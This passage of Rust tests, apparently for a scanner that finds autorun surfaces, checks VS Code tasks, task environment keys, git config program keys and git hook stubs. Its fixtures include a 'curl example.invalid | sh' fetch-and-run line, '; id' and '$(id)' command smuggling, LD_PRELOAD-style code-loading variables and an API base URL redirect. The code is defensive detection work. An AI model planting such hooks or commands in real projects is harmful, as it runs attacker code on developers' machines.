            assert!(runs_file(&s, "tools/sh"), "{extra}: {:?}", commands(&s));
        }
        // At file level, and in the tasks block of a workspace file.
        let file_level = r#"{"options":{"shell":{"executable":"./tools/sh"}},"tasks":[{"label":"t","command":"echo hi","runOptions":{"runOn":"folderOpen"}}]}"#;
        let (s, _) = run(".vscode/tasks.json", file_level);
        assert!(runs_file(&s, "tools/sh"), "{:?}", commands(&s));
        let workspace = r#"{"tasks":{"options":{"shell":{"executable":"./tools/sh"}},"tasks":[{"label":"t","command":"echo hi","runOptions":{"runOn":"folderOpen"}}]}}"#;
        let (s, _) = run("a.code-workspace", workspace);
        assert!(runs_file(&s, "tools/sh"), "{:?}", commands(&s));
        // A task that does not run on open starts nothing.
        let manual = r#"{"tasks":[{"label":"t","command":"echo hi","options":{"shell":{"executable":"./tools/sh"}}}]}"#;
        assert!(run(".vscode/tasks.json", manual).0.is_empty());
    }

    #[test]
    fn a_system_shell_in_a_task_leaves_the_command_as_it_was() {
        let extra = r#","options":{"shell":{"executable":"/bin/bash","args":["-c"]}}"#;
        let (s, _) = run(".vscode/tasks.json", &open_task(extra));
        assert_eq!(commands(&s), ["/bin/bash -c echo hi"]);
        assert!(s.iter().all(|x| shape::files_run(&x.command).is_empty()));
        // The shell's own download-and-run is still seen.
        let evil = r#"{"tasks":[{"label":"t","command":"curl https://example.invalid/x | sh","options":{"shell":{"executable":"bash","args":["-c"]}},"runOptions":{"runOn":"folderOpen"}}]}"#;
        let (s, _) = run(".vscode/tasks.json", evil);
        assert_eq!(shape::classify(&s[0].command), Shape::FetchExec);
    }

    fn task_env(extra: &str) -> Vec<Finding> {
        run(".vscode/tasks.json", &open_task(extra)).1
    }

    fn env_at(place: &str, key: &str, value: &str) -> String {
        let env = format!(r#""env":{{"{key}":"{value}"}}"#);
        match place {
            "task" => format!(r#","options":{{{env}}}"#),
            "linux" => format!(r#","linux":{{"options":{{{env}}}}}"#),
            _ => unreachable!(),
        }
    }

    #[test]
    fn task_env_keys_that_run_code_are_critical() {
        for (key, value) in [
            ("BASH_ENV", "./env.sh"),
            ("ENV", "./env.sh"),
            ("ZDOTDIR", "./z"),
            ("LD_PRELOAD", "./x.so"),
            ("DYLD_INSERT_LIBRARIES", "./x.dylib"),
            ("GIT_SSH_COMMAND", "./ssh"),
            ("GIT_ASKPASS", "./ask"),
            ("SSH_ASKPASS", "./ask"),
            ("GIT_EXEC_PATH", "./g"),
            ("GIT_CONFIG_COUNT", "1"),
            ("GIT_CONFIG_KEY_0", "core.pager"),
            ("PYTHONSTARTUP", "./s.py"),
            ("NODE_OPTIONS", "--require ./x.js"),
            ("PERL5OPT", "-Mx"),
            ("RUBYOPT", "-r./x"),
            ("JAVA_TOOL_OPTIONS", "-javaagent:./a.jar"),
            ("ANTHROPIC_BASE_URL", "https://example.invalid/v1"),
        ] {
            for place in ["task", "linux"] {
                let out = task_env(&env_at(place, key, value));
                let f = named(&out, "autorun.vscode-task-env");
                assert_eq!(f.severity, Severity::Critical, "{key} {place}");
                assert!(f.seen.contains(key), "{}", f.seen);
            }
            // A lower-case spelling is the same key on Windows.
            let out = task_env(&env_at("task", &key.to_ascii_lowercase(), value));
            assert_eq!(
                named(&out, "autorun.vscode-task-env").severity,
                Severity::Critical,
                "{key} in lower case"
            );
        }
        // At file level, for a task that runs on open.
        let text = r#"{"options":{"env":{"LD_PRELOAD":"./x.so"}},"tasks":[{"label":"t","command":"echo hi","runOptions":{"runOn":"folderOpen"}}]}"#;
        let (_, out) = run(".vscode/tasks.json", text);
        assert_eq!(
            named(&out, "autorun.vscode-task-env").severity,
            Severity::Critical
        );
    }

    #[test]
    fn task_env_keys_that_search_the_repo_are_high() {
        for (key, value) in [
            ("PYTHONPATH", "${workspaceFolder}/src"),
            ("PATH", "./bin:${env:PATH}"),
            ("PATH", "${workspaceFolder}/node_modules/.bin:/usr/bin"),
            ("LD_LIBRARY_PATH", "./lib"),
            ("PERL5LIB", "lib"),
            ("RUBYLIB", "./lib"),
        ] {
            let out = task_env(&env_at("task", key, value));
            assert_eq!(
                named(&out, "autorun.vscode-task-env").severity,
                Severity::High,
                "{key}={value}"
            );
        }
    }

    #[test]
    fn ordinary_task_env_is_clean() {
        for (key, value) in [
            ("NODE_OPTIONS", "--max-old-space-size=4096"),
            ("ENV", "production"),
            ("NODE_ENV", "development"),
            ("DEBUG", "app:*"),
            ("PATH", "/usr/local/bin:${env:PATH}"),
            ("LD_LIBRARY_PATH", "/usr/lib"),
            ("PYTHONPATH", "/opt/py"),
            ("JAVA_TOOL_OPTIONS", "-Xmx2g"),
        ] {
            let out = task_env(&env_at("task", key, value));
            assert!(
                !rules(&out).contains(&"autorun.vscode-task-env"),
                "{key}={value}"
            );
        }
        // Another service's base URL is MEDIUM, as in the agent settings.
        let out = task_env(&env_at("task", "API_BASE_URL", "http://localhost:3000"));
        assert_eq!(
            named(&out, "autorun.vscode-task-env").severity,
            Severity::Medium
        );
        // A task that does not run on open has its env left alone.
        let manual =
            r#"{"tasks":[{"label":"t","command":"x","options":{"env":{"LD_PRELOAD":"./x.so"}}}]}"#;
        assert!(run(".vscode/tasks.json", manual).1.is_empty());
    }

    // N12: more git config keys.

    #[test]
    fn more_git_config_keys_that_name_a_program_are_high() {
        for text in [
            "[pager]\n\tlog = ./evil\n",
            "[pager]\n\tdiff = sh evil.sh\n",
            "[gpg \"ssh\"]\n\tdefaultKeyCommand = ./k\n",
            "[gpg.ssh]\n\tdefaultKeyCommand = ./k\n",
            "[interactive]\n\tdiffFilter = ./f\n",
            "[difftool \"x\"]\n\tcmd = ./d\n",
            "[mergetool \"x\"]\n\tcmd = ./m\n",
            "[trailer \"t\"]\n\tcommand = ./t\n",
            "[trailer \"t\"]\n\tcmd = ./t\n",
            "[browser \"b\"]\n\tcmd = ./b\n",
            "[web]\n\tbrowser = ./b\n",
            "[man \"m\"]\n\tcmd = ./m\n",
            "[core]\n\talternateRefsCommand = ./a\n",
            "[Pager]\n\tLOG = ./x\n",
            // An alias whose value continues on the next line.
            "[alias]\n\tx = \\\n!./evil\n",
            "[alias]\n\tx = \\\n    !./evil\n",
            "[alias]\n\tx = \\\r\n!./evil\r\n",
            "[alias]\n\tx = ! \\\n./evil\n",
            "[core]\n\tsshCommand = ./a \\\n  -x\n",
        ] {
            let (_, out) = run(".git/config", text);
            assert_eq!(
                named(&out, "autorun.git-config-command").severity,
                Severity::High,
                "{text:?}"
            );
        }
    }

    #[test]
    fn a_git_config_continuation_keeps_the_line_of_its_first_physical_line() {
        let text = "[core]\n\tbare = false\n[alias]\n\tx = \\\n!./evil\n\ty = z\n";
        let (_, out) = run(".git/config", text);
        let f = named(&out, "autorun.git-config-command");
        assert_eq!(f.line, 4);
        assert!(f.seen.contains("evil"), "{}", f.seen);
    }

    #[test]
    fn ordinary_git_config_values_for_the_new_keys_are_clean() {
        for text in [
            "[pager]\n\tlog = false\n\tdiff = true\n",
            "[alias]\n\tco = checkout\n\tlg = log --oneline \\\n\t\t--graph\n",
            "[web]\n\tfoo = bar\n",
            "[interactive]\n\tsingleKey = true\n",
            "[difftool \"x\"]\n\tprompt = false\n",
            "[core]\n\tbare = false\n",
        ] {
            let (_, out) = run(".git/config", text);
            assert!(out.is_empty(), "{text:?}: {out:?}");
        }
    }

    // N13: stub trust.

    #[test]
    fn a_pre_commit_stub_trusts_only_an_absolute_python_and_the_default_config() {
        let low = |stub: &str| hook_severity(".git/hooks/pre-commit", stub) == Severity::Low;
        assert!(low(PRE_COMMIT_STUB));
        for python in [
            "/usr/bin/python3",
            "/home/u/.pyenv/versions/3.11.4/bin/python3.11",
            "/opt/homebrew/bin/python3",
            "'/Users/Some One/.venv/bin/python'",
        ] {
            let stub = PRE_COMMIT_STUB.replace("/usr/bin/python3", python);
            assert!(low(&stub), "{python}");
        }
        for python in [
            "./evil",
            "evil",
            "../bin/python3",
            "/usr/bin/evil",
            "/proc/self/cwd/python",
            "/dev/shm/python",
            "/tmp/x/python3",
            "/usr/bin/../../tmp/python",
            "'./python'",
        ] {
            let stub = PRE_COMMIT_STUB.replace("/usr/bin/python3", python);
            assert!(!low(&stub), "{python}");
        }
        let with_args = |args: &str| {
            PRE_COMMIT_STUB.replace(
                "ARGS=(hook-impl --config=.pre-commit-config.yaml --hook-type=pre-commit)",
                &format!("ARGS=({args})"),
            )
        };
        assert!(low(&with_args(
            "hook-impl --config=.pre-commit-config.yaml --hook-type=pre-push"
        )));
        assert!(low(&with_args(
            "hook-impl --config=.pre-commit-config.yaml --hook-type=pre-commit --skip-on-missing-config"
        )));
        for args in [
            "hook-impl --config=evil.yaml --hook-type=pre-commit",
            "hook-impl --config=sub/.pre-commit-config.yaml --hook-type=pre-commit",
            "hook-impl --config=../.pre-commit-config.yaml --hook-type=pre-commit",
            "hook-impl --hook-type=pre-commit",
            "hook-impl --config=.pre-commit-config.yaml --hook-type=pre-commit --verbose",
        ] {
            assert!(!low(&with_args(args)), "{args}");
        }
    }

    #[test]
    fn a_lefthook_stub_with_inline_code_is_high() {
        for line in [
            "node -e \"require('fs')\"",
            "python3 -c \"print(1)\"",
            "python -c 'x'",
            "perl -e 1",
            "ruby -e 1",
            "php -r 1",
            "sh -c id",
            "bash -c 'id'",
            "node --eval 1",
            "node -r ./x.js",
            "python3 -m evilmod",
        ] {
            let stub = LEFTHOOK_STUB.replace("echo \"Can't find lefthook in PATH\"", line);
            assert_ne!(stub, LEFTHOOK_STUB);
            assert_eq!(
                hook_severity(".git/hooks/pre-commit", &stub),
                Severity::High,
                "{line}"
            );
        }
        // The stock stub, and its message, are not touched.
        assert_eq!(
            hook_severity(".git/hooks/pre-commit", LEFTHOOK_STUB),
            Severity::Low
        );
    }

    const HUSKY_V9_HOOK: &str = "#!/usr/bin/env sh\n. \"$(dirname \"$0\")/h\"";
    const HUSKY_V9_H: &str = "#!/usr/bin/env sh\n[ \"$HUSKY\" = \"2\" ] && set -x\nn=$(basename \"$0\")\ns=$(dirname \"$(dirname \"$0\")\")/$n\n\n[ ! -f \"$s\" ] && exit 0\n\nif [ -f \"$HOME/.huskyrc\" ]; then\n\techo \"husky - '~/.huskyrc' is DEPRECATED, please move your code to ~/.config/husky/init.sh\"\nfi\ni=\"${XDG_CONFIG_HOME:-$HOME/.config}/husky/init.sh\"\n[ -f \"$i\" ] && . \"$i\"\n\n[ \"${HUSKY-}\" = \"0\" ] && exit 0\n\nexport PATH=\"node_modules/.bin:$PATH\"\nsh -e \"$s\" \"$@\"\nc=$?\n\n[ $c != 0 ] && echo \"husky - $n script failed (code $c)\"\n[ $c = 127 ] && echo \"husky - command not found in PATH=$PATH\"\nexit $c";
    const HUSKY_V9_SH: &str = "echo \"husky - DEPRECATED\n\nPlease remove the following two lines from $0:\n\n#!/usr/bin/env sh\n. \\\"\\$(dirname -- \\\"\\$0\\\")/_/husky.sh\\\"\n\nThey WILL FAIL in v10.0.0\n\"";

    #[test]
    fn the_stock_files_under_husky_underscore_are_not_surfaces() {
        for (path, text) in [
            (".husky/_/pre-commit", HUSKY_V9_HOOK),
            (".husky/_/commit-msg", HUSKY_V9_HOOK),
            (".husky/_/h", HUSKY_V9_H),
            (".husky/_/husky.sh", HUSKY_V9_SH),
            (".husky/_/.gitignore", "*"),
            ("app/.husky/_/pre-push", HUSKY_V9_HOOK),
            (".Husky/_/pre-commit", HUSKY_V9_HOOK),
        ] {
            let (s, out) = run(path, text);
            assert!(s.is_empty() && out.is_empty(), "{path}: {s:?}");
            // A CRLF copy and a trailing newline are the same file.
            let crlf = format!("{}\r\n", text.replace('\n', "\r\n"));
            assert!(run(path, &crlf).0.is_empty(), "{path} CRLF");
        }
    }

    #[test]
    fn an_edited_file_under_husky_underscore_is_a_hook() {
        let evil = "curl https://example.invalid/x | sh";
        for (path, text) in [
            (".husky/_/pre-commit", format!("{HUSKY_V9_HOOK}\n{evil}\n")),
            (".husky/_/pre-commit", format!("{evil}\n{HUSKY_V9_HOOK}\n")),
            (
                ".husky/_/pre-commit",
                HUSKY_V9_HOOK.replace("/h\"", "/x.sh\""),
            ),
            (".husky/_/h", format!("{HUSKY_V9_H}\n{evil}\n")),
            (
                ".husky/_/h",
                HUSKY_V9_H.replace("exit $c", &format!("{evil}; exit $c")),
            ),
            (".husky/_/husky.sh", format!("{HUSKY_V9_SH}\n{evil}\n")),
            (".husky/_/.gitignore", format!("*\n{evil}\n")),
            (".husky/_/not-a-husky-file", evil.to_string()),
        ] {
            let (s, _) = run(path, &text);
            assert!(
                s.iter()
                    .any(|x| x.command.contains("example.invalid") || x.command.contains("x.sh")),
                "{path} {text:?}: {s:?}"
            );
            assert!(s.iter().all(|x| x.rule == "autorun.husky-hook"));
        }
    }

    const HUSKY4_BANNER: &str = "# Created by Husky v4.3.8 (https://github.com/typicode/husky#readme)\n#   At: 1/2/2021, 3:04:05 PM\n#   From: /home/u/app (https://github.com/u/app#readme)";

    fn husky4_hook() -> String {
        format!("#!/bin/sh\n# husky\n\n{HUSKY4_BANNER}\n\n. \"$(dirname \"$0\")/husky.sh\"\n")
    }

    fn husky4_main() -> String {
        format!(
            "{HUSKY4_BANNER}\n\n{}",
            HUSKY4_MAIN.replace("0.0.0", "4.3.8")
        )
    }

    fn husky4_local() -> String {
        format!("{HUSKY4_BANNER}\n\npackageManager=npm\ncd \".\"\n")
    }

    #[test]
    fn the_husky_4_files_in_git_hooks_are_low() {
        for (path, text) in [
            (".git/hooks/pre-commit", husky4_hook()),
            (".git/hooks/commit-msg", husky4_hook()),
            ("sub/.git/hooks/pre-push", husky4_hook()),
            (".git/hooks/husky.sh", husky4_main()),
            (".git/hooks/husky.local.sh", husky4_local()),
            (
                ".git/hooks/husky.local.sh",
                husky4_local().replace("npm", "yarn").replace("\".\"", "\"packages/app\""),
            ),
            // Older 4.x spellings of two lines, and CRLF.
            (
                ".git/hooks/husky.sh",
                husky4_main().replace(
                    "if [ ! -f .huskyrc.js ] && [ ! -f huskyrc.cjs ] && [ ! -f husky.config.js ] && [ ! -f husky.config.cjs ] && ! hookIsDefined; then",
                    "if [ ! -f .huskyrc.js ] && [ ! -f husky.config.js ] && ! hookIsDefined; then",
                ),
            ),
            (".git/hooks/pre-commit", husky4_hook().replace('\n', "\r\n")),
        ] {
            assert_eq!(hook_severity(path, &text), Severity::Low, "{path}");
        }
        let mut out = Vec::new();
        entry_findings(&[".git/hooks/pre-commit"], &mut out);
        lower_hook_stubs(&ctx(".git/hooks/pre-commit", &husky4_hook()), &mut out);
        assert!(out[0].why.contains("husky"), "{}", out[0].why);
    }

    #[test]
    fn an_edited_husky_4_file_is_high() {
        let evil = "curl https://example.invalid/x | sh";
        for (path, text) in [
            (
                ".git/hooks/pre-commit",
                format!("{}{evil}\n", husky4_hook()),
            ),
            (
                ".git/hooks/pre-commit",
                husky4_hook().replace("husky.sh", "x.sh"),
            ),
            (
                ".git/hooks/pre-commit",
                husky4_hook().replace("# husky\n", ""),
            ),
            (
                ".git/hooks/pre-commit",
                husky4_hook().replace("v4.3.8", "v4.3.8; id"),
            ),
            (
                ".git/hooks/pre-commit",
                husky4_hook().replace(
                    "https://github.com/typicode/husky#readme",
                    "https://example.invalid/x",
                ),
            ),
            (
                ".git/hooks/husky.sh",
                format!("{}\n{evil}\n", husky4_main()),
            ),
            (
                ".git/hooks/husky.sh",
                husky4_main().replace("husky-run", "./husky-run"),
            ),
            (
                ".git/hooks/husky.sh",
                husky4_main().replace("exit 0\nfi", "exit 0\nfi\nid"),
            ),
            (
                ".git/hooks/husky.sh",
                husky4_main().replace("huskyVersion=\"4.3.8\"", "huskyVersion=\"4.3.8; id\""),
            ),
            (
                ".git/hooks/husky.local.sh",
                format!("{}{evil}\n", husky4_local()),
            ),
            (
                ".git/hooks/husky.local.sh",
                husky4_local().replace("npm", "npm; id"),
            ),
            (
                ".git/hooks/husky.local.sh",
                husky4_local().replace("\".\"", "\"$(id)\""),
            ),
            // The husky.sh stock text is not a hook of any other name.
            (".git/hooks/post-merge.sh", husky4_main()),
        ] {
            assert_eq!(
                hook_severity(path, &text),
                Severity::High,
                "{path} {text:?}"
            );
        }
    }

    const SGH_PRELUDE: &str = "#!/bin/sh\n\nif [ \"$SKIP_SIMPLE_GIT_HOOKS\" = \"1\" ]; then\n    echo \"[INFO] SKIP_SIMPLE_GIT_HOOKS is set to 1, skipping hook.\"\n    exit 0\nfi\n\nif [ -f \"$SIMPLE_GIT_HOOKS_RC\" ]; then\n    . \"$SIMPLE_GIT_HOOKS_RC\"\nfi\n\n";

    #[test]
    fn a_simple_git_hooks_stub_with_a_plain_command_is_low() {
        for command in [
            "npx lint-staged",
            "npx --no-install lint-staged",
            "pnpm exec lint-staged",
            "yarn lint-staged",
            "npx --no-install commitlint --edit $1",
            "eslint --fix",
        ] {
            let text = format!("{SGH_PRELUDE}{command}");
            assert_eq!(
                hook_severity(".git/hooks/pre-commit", &text),
                Severity::Low,
                "{command}"
            );
            assert_eq!(
                hook_severity(".git/hooks/commit-msg", &format!("{text}\n")),
                Severity::Low,
                "{command} with a newline"
            );
        }
    }

    #[test]
    fn an_edited_simple_git_hooks_stub_is_high() {
        for text in [
            // The command.
            format!("{SGH_PRELUDE}npx evil-package"),
            format!("{SGH_PRELUDE}yarn evil"),
            format!("{SGH_PRELUDE}npm run evil"),
            // A script of the repo's package.json is its own code, whatever its name.
            format!("{SGH_PRELUDE}npm run lint"),
            format!("{SGH_PRELUDE}npm test"),
            format!("{SGH_PRELUDE}npx lint-staged --config ./evil.js"),
            format!("{SGH_PRELUDE}npx lint-staged --config=evil.js"),
            format!("{SGH_PRELUDE}git config core.hooksPath x"),
            format!("{SGH_PRELUDE}rm -rf x"),
            format!("{SGH_PRELUDE}node check.js"),
            format!("{SGH_PRELUDE}./scripts/hook.sh"),
            format!("{SGH_PRELUDE}python3 -m pytest"),
            format!("{SGH_PRELUDE}sh -c id"),
            format!("{SGH_PRELUDE}curl https://example.invalid/x | sh"),
            format!("{SGH_PRELUDE}npx lint-staged && ./x.sh"),
            format!("{SGH_PRELUDE}npx lint-staged; id"),
            format!("{SGH_PRELUDE}npx lint-staged\nid"),
            format!("{SGH_PRELUDE}$(id)"),
            SGH_PRELUDE.to_string(),
            // The prelude.
            SGH_PRELUDE.replace("exit 0", "id").to_string() + "npx lint-staged",
            SGH_PRELUDE
                .replace("\n\nif [ -f", "\nid\n\nif [ -f")
                .to_string()
                + "npx lint-staged",
            format!("id\n{SGH_PRELUDE}npx lint-staged"),
        ] {
            assert_eq!(
                hook_severity(".git/hooks/pre-commit", &text),
                Severity::High,
                "{text:?}"
            );
        }
    }

    // False alarm 2: which settings name a program, and where the target must be.

    fn program_findings(paths: &[&str], settings: &str, text: &str) -> Vec<Finding> {
        let (_, mut out) = run(settings, text);
        entry_findings(paths, &mut out);
        out.into_iter()
            .filter(|f| f.rule == "autorun.vscode-program")
            .collect()
    }

    #[test]
    fn a_program_setting_is_high_only_when_its_target_is_in_the_tree() {
        let settings = ".vscode/settings.json";
        for (key, value, entry) in [
            ("git.path", "./bin/git", "bin/git"),
            (
                "python.defaultInterpreterPath",
                "${workspaceFolder}/.venv/bin/python",
                ".venv/bin/python",
            ),
            ("python.pythonPath", ".venv/bin/python", ".venv/bin/python"),
            (
                "typescript.tsdk",
                "tools/ts/lib",
                "tools/ts/lib/tsserver.js",
            ),
            ("eslint.runtime", "scripts/node", "scripts/node"),
            (
                "eslint.nodePath",
                "./tools",
                "tools/node_modules/x/index.js",
            ),
            ("rust-analyzer.server.path", "./ra", "ra"),
            ("php.validate.executablePath", "./php", "php"),
            ("some.ext.executablePath", "./bin/x", "bin/x"),
            ("some.ext.serverPath", "./srv", "srv"),
            ("terminal.integrated.shell.linux", "./sh", "sh"),
            // The entry is found without regard to case.
            ("git.path", "./bin/git", "Bin/Git"),
        ] {
            let text = format!("{{\"{key}\": \"{value}\"}}");
            let present = program_findings(&[settings, entry], settings, &text);
            assert_eq!(present[0].severity, Severity::High, "{key} {value}");
            let absent = program_findings(&[settings, "README.md"], settings, &text);
            assert!(absent[0].severity < Severity::High, "{key} {value} absent");
            assert!(absent[0].severity >= Severity::Low, "{key} {value} absent");
        }
        // A folder that only has the target as a prefix of another name is not it.
        let text = r#"{"git.path": "./bin/git"}"#;
        let near = program_findings(&[settings, "bin/gitx"], settings, text);
        assert!(near[0].severity < Severity::High);
    }

    #[test]
    fn a_program_setting_in_a_workspace_file_is_read_from_the_workspace_folder() {
        let text = r#"{"settings": {"git.path": "./bin/git"}}"#;
        let found = program_findings(
            &["app/dev.code-workspace", "app/bin/git"],
            "app/dev.code-workspace",
            text,
        );
        assert_eq!(found[0].severity, Severity::High);
        let found = program_findings(
            &["app/dev.code-workspace", "bin/git"],
            "app/dev.code-workspace",
            text,
        );
        assert!(found[0].severity < Severity::High);
        // A settings file keeps its target next to the .vscode folder.
        let text = r#"{"git.path": "./bin/git"}"#;
        let found = program_findings(
            &["app/.vscode/settings.json", "app/bin/git"],
            "app/.vscode/settings.json",
            text,
        );
        assert_eq!(found[0].severity, Severity::High);
        let found = program_findings(
            &["app/.vscode/settings.json", "bin/git"],
            "app/.vscode/settings.json",
            text,
        );
        assert!(found[0].severity < Severity::High);
    }

    #[test]
    fn nested_program_settings_are_read() {
        let settings = ".vscode/settings.json";
        for text in [
            r#"{"go.alternateTools": {"go": "./bin/go"}}"#,
            r#"{"terminal.integrated.profiles.linux": {"mine": {"path": "./bin/sh", "args": ["-l"]}}}"#,
            r#"{"terminal.integrated.profiles.osx": {"mine": {"path": ["/nope", "./bin/sh"]}}}"#,
        ] {
            let found = program_findings(&[settings, "bin/go", "bin/sh"], settings, text);
            assert_eq!(found[0].severity, Severity::High, "{text}");
            let found = program_findings(&[settings], settings, text);
            assert!(found[0].severity < Severity::High, "{text} absent");
        }
        // A profile path outside the repo.
        let text = r#"{"terminal.integrated.profiles.linux": {"zsh": {"path": "/usr/bin/zsh"}}}"#;
        let found = program_findings(&[settings, "usr/bin/zsh"], settings, text);
        assert_eq!(found[0].severity, Severity::Medium);
    }

    #[test]
    fn a_target_outside_the_repo_stays_medium_whether_or_not_it_is_in_the_tree() {
        let settings = ".vscode/settings.json";
        for value in [
            "/usr/bin/git",
            "~/bin/git",
            "../bin/git",
            "./../bin/git",
            "./a/../../bin/git",
            "node_modules/.bin/git",
            "${userHome}/git",
        ] {
            let text = format!("{{\"git.path\": \"{value}\"}}");
            let found = program_findings(
                &[settings, "bin/git", "usr/bin/git", "node_modules/.bin/git"],
                settings,
                &text,
            );
            assert_eq!(found[0].severity, Severity::Medium, "{value}");
        }
        // `..` that stays inside the repo is a target in the repo.
        let text = r#"{"git.path": "./a/../bin/git"}"#;
        let found = program_findings(&[settings, "bin/git"], settings, text);
        assert_eq!(found[0].severity, Severity::High);
    }

    #[test]
    fn keys_that_are_not_programs_are_not_rated() {
        // Config, ignore, stub and venv path keys name data, not a program.
        let settings = ".vscode/settings.json";
        let text = r#"{
  "python.venvPath": "./venvs",
  "python.analysis.stubPath": "./typings",
  "python.analysis.extraPaths": ["./src"],
  "mypy-type-checker.ignorePatterns": ["./x"],
  "ruff.configuration": "./ruff.toml",
  "eslint.options": {"overrideConfigFile": "./x.json"},
  "eslint.workingDirectories": ["./app"],
  "prettier.configPath": "./.prettierrc",
  "prettier.ignorePath": "./.prettierignore",
  "black-formatter.path": ["./bin/black"],
  "cmake.configurePath": "./build",
  "java.jdt.ls.vmargs": "./x",
  "myext.path": "./x"
}"#;
        let found = program_findings(
            &[
                settings,
                "venvs/x",
                "typings/x",
                "src/x",
                "ruff.toml",
                "x.json",
                "bin/black",
                "build/x",
            ],
            settings,
            text,
        );
        assert!(found.is_empty(), "{found:?}");
        // A bare name is on PATH, not in the repo.
        let found = program_findings(&[settings, "git"], settings, r#"{"git.path": "git"}"#);
        assert!(found.is_empty());
    }

    #[test]
    fn the_vscode_hidden_check_is_not_changed_by_the_tree() {
        let settings = ".vscode/settings.json";
        let (_, mut out) = run(settings, r#"{"files.exclude": {"**/.vscode": true}}"#);
        entry_findings(&[settings], &mut out);
        assert_eq!(
            named(&out, "autorun.vscode-hidden").severity,
            Severity::High
        );
    }

    #[test]
    fn files_that_are_not_known_find_nothing() {
        for path in [
            "src/main.rs",
            "README.md",
            "a/b/c.json",
            "package-lock.json",
        ] {
            let (s, out) = run(path, "{\"scripts\":{\"postinstall\":\"x\"}}\n");
            assert!(s.is_empty() && out.is_empty(), "{path}");
        }
    }
}
